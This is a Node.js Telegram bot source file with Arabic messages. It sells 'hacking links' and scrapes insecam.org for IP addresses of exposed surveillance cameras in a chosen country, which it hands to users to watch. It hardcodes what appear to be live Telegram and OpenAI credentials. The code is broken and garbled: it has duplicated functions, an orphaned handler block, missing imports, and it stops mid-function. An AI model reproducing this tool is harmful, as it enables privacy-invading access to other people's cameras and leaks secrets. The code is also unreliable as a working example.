const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs').promises;
const path = require('path');
const useragent = require('useragent');
const TinyURL = require('tinyurl');

// استدعاء دالة تحميل البيانات
// في بداية البرنامج
loadData().then(() => {
  console.log('تم تحميل البيانات وبدء تشغيل البوت');
  // هنا يمكنك بدء تشغيل البوت
}).catch(error => {
  console.error('حدث خطأ أثناء تحميل البيانات:', error);
  process.exit(1);
});
;

const botToken = '8116637783:AAHPP3YbcZ2h2NqsmX2M-R6SvIYvXPfDulw';
const bot = new TelegramBot(botToken, { polling: true });

// باقي إعدادات البوت والتطبيق

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'uploads')));
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });


function initializeDefaultData() {
  userVisits = {};
  platformVisits = {};
  allUsers = new Map();
  activatedUsers = new Set();
  bannedUsers = new Map();
  subscribedUsers = new Set();
  userPoints = new Map();
  userReferrals = new Map();
  usedReferralLinks = new Map();
  pointsRequiredForSubscription = 15;
}
const MAX_FREE_ATTEMPTS = 5;
const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";

const forcedChannelUsernames = ['@SJGDDW', '@SJGDDW', '@SJGDDW'];


// دالة للتحقق من المسؤول
const adminId = '7130416076';
function isAdmin(userId) {
  return userId.toString() === adminId;
}

// دالة لإضافة نقاط لمستخدم معين
function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
  return user.points;
}

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد خصم النقاط
    return true;
  }
  return false;
}

// دالة لحظر مستخدم
function banUser(userId) {
  bannedUsers.set(userId.toString(), true);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
}
// دالة لإلغاء حظر مستخدم
function unbanUser(userId) {
  const result = bannedUsers.delete(userId.toString());
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error));
  return result;
}
// دالة لإرسال رسالة لجميع المستخدمين
function broadcastMessage(message) {
  allUsers.forEach((user, userId) => {
    bot.sendMessage(userId, message).catch(error => {
      console.error(`Error sending message to ${userId}:`, error.message);
    });
  });
}

// دالة إنشاء لوحة المفاتيح للمسؤول
function createAdminKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'حظر مستخدم', callback_data: 'ban' }],
        [{ text: 'إلغاء حظر مستخدم', callback_data:'unban' }],
        [{ text: 'عرض الإحصائيات', callback_data:'stats' }],
        [{ text: 'إرسال رسالة', callback_data:'broadcast' }],
        [{ text: 'قائمة المحظورين', callback_data:'abo' }],
        [{ text: 'إضافة نقاط', callback_data: 'addpoints' }],
        [{ text: 'خصم نقاط', callback_data:'deductpoints' }],
        [{ text: 'تعيين نقاط الاشتراك', callback_data: 'setsubscriptionpoints' }],
        [{ text: 'الاشتراك', callback_data:'subscribe' }],
        [{ text: 'إلغاء الاشتراك', callback_data:'unsubscribe' }],
        [{ text: 'إلغاء اشتراك جميع المستخدمين', callback_data:'unsubscribe_all' }],
        [{ text: 'إضافة اشتراك لجميع المستخدمين ', callback_data:'subscribe_all' }],
        [{ text: 'عرض المشتركين', callback_data:'listsubscribers' }],
        [{ text: 'إرسال نقاط للجميع', callback_data:'send_points_to_all' }],
        [{ text: 'خصم نقاط من الجميع', callback_data:'deduct_points_from_all' }],
        [{ text: 'حظر جميع المستخدمين', callback_data: 'ban_all_users' }],
        [{ text: 'إلغاء حظر جميع المستخدمين', callback_data:'unban_all_users' }],
      ]
    }
  };
}

// أمر المسؤول
// أمر المسؤول
bot.onText(/\/admin/, (msg) => {
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'مرحبًا بك في لوحة تحكم المسؤول:', createAdminKeyboard());
  } else {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
  }
});

// معالج callback_query للمسؤول
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const userId = callbackQuery.from.id;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (!isAdmin(userId)) {
    await bot.answerCallbackQuery(callbackQuery.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  switch (data) {
    case 'ban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد حظره:');
      bot.once('message', async (response) => {
        const userIdToBan = response.text;
        banUser(userIdToBan);
        bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
        bot.sendMessage(userIdToBan, 'تم حظرك من استخدام هذا البوت. تواصل مع المسؤول إذا كنت تعتقد أن هذا خطأ.');
      });
      break;

    case 'unban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد إلغاء حظره:');
      bot.once('message', async (response) => {
        const userIdToUnban = response.text;
        if (unbanUser(userIdToUnban)) {
          bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
          bot.sendMessage(userIdToUnban, 'تم إلغاء حظرك. يمكنك الآن استخدام البوت مرة أخرى.');
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnban} غير محظور.`);
        }
      });
      break;
    case 'banned_users':
  const bannedList = Array.from(bannedUsers).join(', ');
  bot.sendMessage(chatId, `قائمة المستخدمين المحظورين:\n${bannedList || 'لا يوجد مستخدمين محظورين حاليًا'}`);
  break;
    case 'addpoints':
  bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد إضافتها (مثال: 123456789 10)');
  bot.once('message', async (response) => {
    const [userId, points] = response.text.split(' ');
    const pointsToAdd = parseInt(points);
    if (!userId || isNaN(pointsToAdd)) {
      bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
      return;
    }
    const newPoints = addPointsToUser(userId, pointsToAdd);
    bot.sendMessage(chatId, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
  });
  break;
    case 'deductpoints':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد خصمها (مثال: 123456789 10)');
      bot.once('message', async (response) => {
        const [userId, points] = response.text.split(' ');
        const pointsToDeduct = parseInt(points);
        if (!userId || isNaN(pointsToDeduct)) {
          bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
          return;
        }
        if (deductPointsFromUser(userId, pointsToDeduct)) {
          const newPoints = userPoints.get(userId) || 0;
          bot.sendMessage(chatId, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
          bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
        } else {
          bot.sendMessage(chatId, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
        }
      });
      break;
    case 'setsubscriptionpoints':
      bot.sendMessage(chatId, 'أدخل عدد النقاط المطلوبة للاشتراك:');
      bot.once('message', async (response) => {
        pointsRequiredForSubscription = parseInt(response.text);
        bot.sendMessage(chatId, `تم تعيين عدد النقاط المطلوبة للاشتراك إلى ${pointsRequiredForSubscription}`);
      });
      break;
    case 'subscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إضافته للمشتركين:');
      bot.once('message', async (response) => {
        const userIdToSubscribe = response.text;
        if (subscribeUser(userIdToSubscribe)) {
          bot.sendMessage(chatId, `تم اشتراك المستخدم ${userIdToSubscribe} بنجاح.`);
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToSubscribe} مشترك بالفعل.`);
        }
      });
      break;

    case 'unsubscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إلغاء اشتراكه:');
      bot.once('message', async (response) => {
        const userIdToUnsubscribe = response.text;
        if (unsubscribeUser(userIdToUnsubscribe)) {
          bot.sendMessage(chatId, `تم إلغاء اشتراك المستخدم ${userIdToUnsubscribe} بنجاح.`);
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnsubscribe} غير مشترك أصلاً.`);
        }
      });
      break;
    case 'listsubscribers':
      const subscribersList = Array.from(subscribedUsers).join('\n');
      bot.sendMessage(chatId, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
      break;
    case 'send_points_to_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد إرسالها لجميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        addPointsToUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم إرسال ${points} نقطة لجميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
    case 'deduct_points_from_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد خصمها من جميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        deductPointsFromUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم خصم ${points} نقطة من جميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
  case 'unsubscribe_all':
      const unsubscribedCount = subscribedUsers.size;
      subscribedUsers.clear();
      await bot.sendMessage(chatId, `تم إلغاء اشتراك جميع المستخدمين. تم إلغاء اشتراك ${unsubscribedCount} مستخدم.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء اشتراك الجميع
      break;

      case 'subscribe_all':
      let subscribedCount = 0;
      for (const [userId, user] of allUsers) {
        if (!subscribedUsers.has(userId)) {
          subscribedUsers.add(userId);
          subscribedCount++;
          try {
            await bot.sendMessage(userId, 'تم تفعيل اشتراكك في البوت. يمكنك الآن استخدام جميع الميزات.');
          } catch (error) {
            console.error(`فشل في إرسال رسالة للمستخدم ${userId}:`, error);
          }
        }
      }
      await bot.sendMessage(chatId, `تم إضافة اشتراك لـ ${subscribedCount} مستخدم جديد.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد اشتراك الجميع
      break;
     case 'ban_all_users':
      allUsers.forEach((user, userId) => {
        bannedUsers.set(userId, true);
      });
      await bot.sendMessage(chatId, 'تم حظر جميع المستخدمين.');
      broadcastMessage('تم إيقاف استخدام البوت من قبل المطور.');
      break;

    case 'unban_all_users':
      bannedUsers.clear();
      await bot.sendMessage(chatId, 'تم إلغاء حظر جميع المستخدمين.');
      broadcastMessage('تم تشغيل البوت من قبل المطور.');
      break;
  }

  await bot.answerCallbackQuery(callbackQuery.id);
});

bot.on('some_event', (msg) => {
  sendBotStats(msg.chat.id);
});

  // معالج زر "نقاطي"

// الكائنات المستخدمة لتخزين البيانات

// دالة لتسجيل مسؤول الحظر
function recordBanAction(userId, adminId) {
  const adminName = getUsername(adminId); // استرجاع اسم المسؤول
  bannedUsers.set(userId, adminName); // تسجيل اسم المسؤول الذي قام بالحظر
}

// دالة لاسترداد اسم المسؤول
function getUsername(userId) {
  return allUsers.get(userId)?.username || 'Unknown';
}

// دالة لتحديث حالة حظر المستخدم للبوت
function updateUserBlockStatus(userId, hasBlocked) {
  if (allUsers.has(userId)) {
    allUsers.get(userId).hasBlockedBot = hasBlocked;
  } else {
    allUsers.set(userId, { hasBlockedBot: hasBlocked });
  }
}

// مستمع لحدث مغادرة العضو
bot.on('left_chat_member', (msg) => {
  const userId = msg.left_chat_member.id;
  if (!msg.left_chat_member.is_bot) {
    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
  }
});

// مستمع لحظر البوت من قبل المستخدم
bot.on('my_chat_member', (msg) => {
  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
    const userId = msg.from.id;
    updateUserBlockStatus(userId, true); // تحديث حالة حظر البوت للمستخدم
  }
});

// دالة للتحقق مما إذا كان المستخدم محظورًا
function isUserBlocked(userId) {
  return allUsers.get(userId)?.hasBlockedBot || false;
}

// دالة لحساب الإحصائيات وإرسالها
function sendBotStats(chatId) {
  const totalUsers = allUsers.size;
  const activeUsers = activatedUsers.size;
  const bannedUsersCount = bannedUsers.size;
  const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;

  bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
}

bot.on('message', (msg) => {
  const userId = msg.from.id;
  const chatId = msg.chat.id;
  const text = msg.text;

  if (isUserBlocked(userId)) {
    if (hasUserBlockedBefore(userId)) {
      bot.sendMessage(chatId, 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', {
        reply_markup: {
          remove_keyboard: true,
        },
      });
    } else {
      updateUserBlockStatus(userId, true);
      bot.sendMessage(chatId, 'لقد قمت بحظر البوت، لا يمكنك استخدام البوت مرة أخرى.');
    }
    return;
  }

  // باقي الكود للتفاعل مع الرسائل
  // إذا كان المستخدم غير محظور، يمكنك إضافة الميزات والأزرار هنا.
});

// مستمع للضغط على الأزرار
bot.on('callback_query', (query) => {
  const userId = query.from.id;
  const chatId = query.message.chat.id;
  const data = query.data;

  if (isUserBlocked(userId)) {
    if (hasUserBlockedBefore(userId)) {
      bot.answerCallbackQuery(query.id, { text: 'لقد تم حظرك من استخدام البوت لأنك قمت بحذفه وحظره.', show_alert: true });
    } else {
      updateUserBlockStatus(userId, true);
      bot.answerCallbackQuery(query.id, { text: 'لقد قمت بحظر البوت، لا يمكنك استخدام البوت مرة أخرى.', show_alert: true });
    }
    return;
  }

  switch (data) {
    case 'stats':
      sendBotStats(chatId);
      break;
    
    // الحالات الأخرى يمكن إضافتها هنا
    
    
  }
});


const countryTranslation = {
  "AF": "أفغانستان 🇦🇫",
  "AL": "ألبانيا 🇦🇱",
  "DZ": "الجزائر 🇩🇿",
  "AO": "أنغولا 🇦🇴",
  "AR": "الأرجنتين 🇦🇷",
  "AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BH": "البحرين 🇧🇭",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IQ": "العراق 🇮🇶",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "JO": "الأردن 🇯🇴",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KW": "الكويت 🇰🇼",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LB": "لبنان 🇱🇧",
  "LY": "ليبيا 🇱🇾",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "OM": "عمان 🇴🇲",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "QA": "قطر 🇶🇦",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SA": "السعودية 🇸🇦",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩" 

    // ... إضافة بقية الدول هنا
};

// متغير لتتبع عدد مرات الضغط على زر الكاميرات
const camRequestCounts = {};


 if (data === 'get_joke') {
        try {
            const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: jokeMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-proj-dT4qHY9IlzNZ9ArWAWH0T3BlbkFJF0RqqSlm6K05ZIMcKjlk',
                    'Content-Type': 'application/json'
                }
            });
            const joke = response.data.choices[0].message.content;

            bot.sendMessage(chatId, joke);
        } catch (error) {
            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا.');
        }
    } else if (data === 'get_love_message') {
        try {
            const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: loveMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-proj-dT4qHY9IlzNZ9ArWAWH0T3BlbkFJF0RqqSlm6K05ZIMcKjlk',
                    'Content-Type': 'application/json'
                }
            });
            const love = response.data.choices[0].message.content;

            bot.sendMessage(chatId, love);
        } catch (error) {
            console.error('Error fetching love message:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحقًا.');

function showCountryList(chatId, startIndex = 0) {
    try {
        const buttons = [];
        const countryCodes = Object.keys(countryTranslation);
        const countryNames = Object.values(countryTranslation);

        const endIndex = Math.min(startIndex + 99, countryCodes.length);

        for (let i = startIndex; i < endIndex; i += 3) {
            const row = [];
            for (let j = i; j < i + 3 && j < endIndex; j++) {
                const code = countryCodes[j];
                const name = countryNames[j];
                row.push({ text: name, callback_data: code });
            }
            buttons.push(row);
        }

        const navigationButtons = [];
        if (startIndex > 0) {
            navigationButtons.push 
        }
        if (endIndex < countryCodes.length) {
            navigationButtons.push({ text: "المزيد", callback_data: `next_${endIndex}` });
        }

        if (navigationButtons.length) {
            buttons.push(navigationButtons);
        }

        bot.sendMessage(chatId, "اختر الدولة:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    } catch (error) {
        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
    }
}

// عرض الكاميرات
async function displayCameras(chatId, countryCode) {
    try {
        // عرض الكاميرات كالمعتاد
        const message = await bot.sendMessage(chatId, "جاري اختراق كامراة مراقبه.....");
        const messageId = message.message_id;

        for (let i = 0; i < 15; i++) {
            await bot.editMessageText(`جاري اختراق كامراة مراقبه${'.'.repeat(i % 4)}`, {
                chat_id: chatId,
                message_id: messageId
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        };

        let res = await axios.get(url, { headers });
        const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
        if (!lastPageMatch) {
            bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
            return;
        }
        const lastPage = parseInt(lastPageMatch[1], 10);
        const cameras = [];

        for (let page = 1; page <= lastPage; page++) {
            res = await axios.get(`${url}/?page=${page}`, { headers });
            const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            cameras.push(...pageCameras);
        }

        if (cameras.length) {
            const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
            for (let i = 0; i < numberedCameras.length; i += 50) {
                const chunk = numberedCameras.slice(i, i + 50);
                await bot.sendMessage(chatId, chunk.join('\n'));
            }
            await bot.sendMessage(chatId, "لقد تم اختراق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك سجاد.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
        } else {
            await bot.sendMessage(chatId, "لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
        }
    } catch (error) {
        await bot.sendMessage(chatId, `لم يتم اختراق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
    }
}



          

async function saveData() {
  const data = {
    userVisits,
    platformVisits,
    allUsers: Array.from(allUsers),
    activatedUsers: Array.from(activatedUsers),
    bannedUsers: Array.from(bannedUsers),
    subscribedUsers: Array.from(subscribedUsers),
    userPoints: Array.from(userPoints),
    userReferrals: Array.from(userReferrals),
    usedReferralLinks: Array.from(usedReferralLinks),
    pointsRequiredForSubscription
  };
  
  try {
    await fs.writeFile('botData.json', JSON.stringify(data, null, 2));
    console.log('تم حفظ البيانات بنجاح');
    
    // حفظ نسخة احتياطية
    await fs.writeFile('botData_backup.json', JSON.stringify(data, null, 2));
    console.log('تم إنشاء نسخة احتياطية بنجاح');
  } catch (error) {
    console.error('خطأ في حفظ البيانات:', error);
    throw error; // إعادة رمي الخطأ للتعامل معه في مكان آخر إذا لزم الأمر
  }
}

// استدعاء هذه الدالة بعد كل عملية تغيير للبيانات


async function loadData() {
  try {
    // محاولة تحميل البيانات من الملف الرئيسي
    const data = JSON.parse(await fs.readFile('botData.json', 'utf8'));
    applyLoadedData(data);
    console.log('تم تحميل البيانات بنجاح من الملف الرئيسي');
  } catch (error) {
    if (error.code === 'ENOENT') {
      console.log('الملف الرئيسي غير موجود، محاولة تحميل النسخة الاحتياطية');
      try {
        // محاولة تحميل البيانات من النسخة الاحتياطية
        const backupData = JSON.parse(await fs.readFile('botData_backup.json', 'utf8'));
        applyLoadedData(backupData);
        console.log('تم تحميل البيانات بنجاح من النسخة الاحتياطية');
      } catch (backupError) {
        console.log('فشل في تحميل النسخة الاحتياطية، سيتم تهيئة البيانات الافتراضية');
        initializeDefaultData();
      }
    } else {
      console.error('خطأ في تحميل البيانات:', error);
      initializeDefaultData();
    }
  }
  
  // حفظ البيانات بعد التحميل لضمان وجود ملف حديث
  await saveData();
}
function applyLoadedData(data) {
  userVisits = data.userVisits || {};
  platformVisits = data.platformVisits || {};
  allUsers = new Map(data.allUsers || []);
  activatedUsers = new Set(data.activatedUsers || []);
  bannedUsers = new Map(data.bannedUsers || []);
  subscribedUsers = new Set(data.subscribedUsers || []);
  userPoints = new Map(data.userPoints || []);
  userReferrals = new Map(data.userReferrals || []);
  usedReferralLinks = new Map(data.usedReferralLinks || []);
  pointsRequiredForSubscription = data.pointsRequiredForSubscription || 15;
}


function subscribeUser(userId) {
  if (!subscribedUsers.has(userId)) {
    subscribedUsers.add(userId);
    bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك الآن استخدام جميع ميزات البوت.');
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد الاشتراك
    return true;
  }
  return false;
}

function unsubscribeUser(userId) {
  if (subscribedUsers.has(userId)) {
    subscribedUsers.delete(userId);
    bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء الاشتراك
    return true;
  }
  return false;
}

  // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
// حفظ البيانات كل 5 دقائق
// حفظ البيانات كل 5 دقائق
// حفظ البيانات كل 5 دقائق
setInterval(() => {
  saveData().catch(error => console.error('فشل في الحفظ الدوري للبيانات:', error));
}, 5 * 60 * 1000);
  // باقي الكود لمعالجة الرسائل
 
  process.on('SIGINT', async () => {
  console.log('تم استلام إشارة إيقاف، جاري حفظ البيانات...');
  try {
    await saveData();
    console.log('تم حفظ البيانات بنجاح. إيقاف البوت...');
    process.exit(0);
  } catch (error) {
    console.error('فشل في حفظ البيانات قبل الإيقاف:', error);
    process.exit(1);
  }
});
 // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية

// ... (الكود السابق)



// تعديل دالة إضافة النقاط

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    console.log(`المستخدم ${userId} غير موجود`);
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
